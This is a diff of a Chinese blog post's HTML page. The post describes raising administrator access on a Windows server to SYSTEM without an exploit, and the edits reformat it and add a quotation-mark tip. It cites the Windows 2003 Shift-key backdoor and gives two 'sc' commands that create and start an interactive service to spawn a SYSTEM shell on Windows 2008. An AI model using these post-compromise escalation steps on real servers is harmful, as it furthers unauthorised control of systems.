@@ -119,20 +119,20 @@
 
 
 
-<meta name="description" content="正文当administrator权限进入服务器后，不利用exp的情况下提升到system权限。  windows2003通过shift后门弹出来的cmd是system权限。 windows2008依次执行下面两条命令：    sc Create SuperCMD binPath= “cmd /K start” type= own type= interact    sc start SuperCM">
+<meta name="description" content="正文当administrator权限进入服务器后，不利用exp的情况下提升到system权限。  windows2003通过shift后门弹出来的cmd是system权限。 windows2008依次执行下面两条命令：  sc Create SuperCMD binPath= “cmd /K start” type= own type= interact// 注意，”cmd /K start”，这">
 <meta name="keywords" content="提权">
 <meta property="og:type" content="article">
 <meta property="og:title" content="administrator提升system权限小技巧">
 <meta property="og:url" content="http://love71.today/2017/11/05/administrator提升system权限小技巧/index.html">
 <meta property="og:site_name" content="老酒馆的怅然若梦">
-<meta property="og:description" content="正文当administrator权限进入服务器后，不利用exp的情况下提升到system权限。  windows2003通过shift后门弹出来的cmd是system权限。 windows2008依次执行下面两条命令：    sc Create SuperCMD binPath= “cmd /K start” type= own type= interact    sc start SuperCM">
+<meta property="og:description" content="正文当administrator权限进入服务器后，不利用exp的情况下提升到system权限。  windows2003通过shift后门弹出来的cmd是system权限。 windows2008依次执行下面两条命令：  sc Create SuperCMD binPath= “cmd /K start” type= own type= interact// 注意，”cmd /K start”，这">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://oymn0s4fo.bkt.clouddn.com/4dq3pz54xab575l7fvmrsobikk.png">
 <meta property="og:image" content="http://oymn0s4fo.bkt.clouddn.com/2a2hnxlhiqoderv2ie24jthuxr.png">
-<meta property="og:updated_time" content="2017-11-05T15:05:49.332Z">
+<meta property="og:updated_time" content="2017-11-10T03:44:37.265Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="administrator提升system权限小技巧">
-<meta name="twitter:description" content="正文当administrator权限进入服务器后，不利用exp的情况下提升到system权限。  windows2003通过shift后门弹出来的cmd是system权限。 windows2008依次执行下面两条命令：    sc Create SuperCMD binPath= “cmd /K start” type= own type= interact    sc start SuperCM">
+<meta name="twitter:description" content="正文当administrator权限进入服务器后，不利用exp的情况下提升到system权限。  windows2003通过shift后门弹出来的cmd是system权限。 windows2008依次执行下面两条命令：  sc Create SuperCMD binPath= “cmd /K start” type= own type= interact// 注意，”cmd /K start”，这">
 <meta name="twitter:image" content="http://oymn0s4fo.bkt.clouddn.com/4dq3pz54xab575l7fvmrsobikk.png">
 
 
@@ -435,7 +435,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  92
+                  128
                 </span>
               
 
@@ -463,19 +463,14 @@
         <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>当administrator权限进入服务器后，不利用exp的情况下提升到system权限。</p>
 <ul>
 <li>windows2003通过shift后门弹出来的cmd是system权限。</li>
-<li>windows2008依次执行下面两条命令：</li>
-</ul>
+<li>windows2008依次执行下面两条命令：<blockquote>
 <ol>
-<li><blockquote>
-<p>sc Create SuperCMD binPath= “cmd /K start” type= own type= interact</p>
-</blockquote>
-</li>
-<li><blockquote>
-<p>sc start SuperCMD</p>
-</blockquote>
-</li>
+<li>sc Create SuperCMD binPath= “cmd /K start” type= own type= interact<br>// <strong>注意，”cmd /K start”，这是英文引号，不是中文，好像文章中他会自动变成中文引号，大家手动改下。</strong></li>
+<li>sc start SuperCMD<br>当执行完第二条后会出现如图情况：<br><img src="http://oymn0s4fo.bkt.clouddn.com/4dq3pz54xab575l7fvmrsobikk.png" alt=""><br>进入后弹出来的cmd就是system权限了。<br><img src="http://oymn0s4fo.bkt.clouddn.com/2a2hnxlhiqoderv2ie24jthuxr.png" alt=""></li>
 </ol>
-<p>当执行完第二条后会出现如图情况：<br><img src="http://oymn0s4fo.bkt.clouddn.com/4dq3pz54xab575l7fvmrsobikk.png" alt=""><br>进入后弹出来的cmd就是system权限了。<br><img src="http://oymn0s4fo.bkt.clouddn.com/2a2hnxlhiqoderv2ie24jthuxr.png" alt=""></p>
+</blockquote>
+</li>
+</ul>
 
       
     </div>
